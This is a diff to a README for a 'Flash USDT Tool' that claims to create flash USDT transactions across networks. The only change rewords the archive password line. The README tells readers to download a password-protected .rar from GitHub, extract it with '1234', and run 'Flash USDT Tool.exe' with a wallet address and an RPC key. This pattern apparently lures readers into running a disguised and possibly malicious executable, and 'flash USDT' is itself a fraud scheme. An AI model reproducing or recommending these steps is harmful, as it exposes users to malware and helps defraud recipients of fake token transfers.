@@ -13,7 +13,7 @@ Multi-network flash transaction tool for USDT with configurable duration and cus
 
 ## 🚀 How to use
 1. Download latest version [https://github.com/NovaNexusRewards/Flash-USDT-Tool/blob/main/Flash%20USDT%20Tool.rar]
-2. Extract ( 1234 PASSWORD )
+2. Extract ( Archive password: 1234 )
 3. Run `Flash USDT Tool.exe` from Command Prompt:
 ```cmd
 Flash USDT Tool.exe --net=erc20 --to=0xYourAddress --amount=100 --rpc=https://mainnet.infura.io/v3/YOUR_KEY
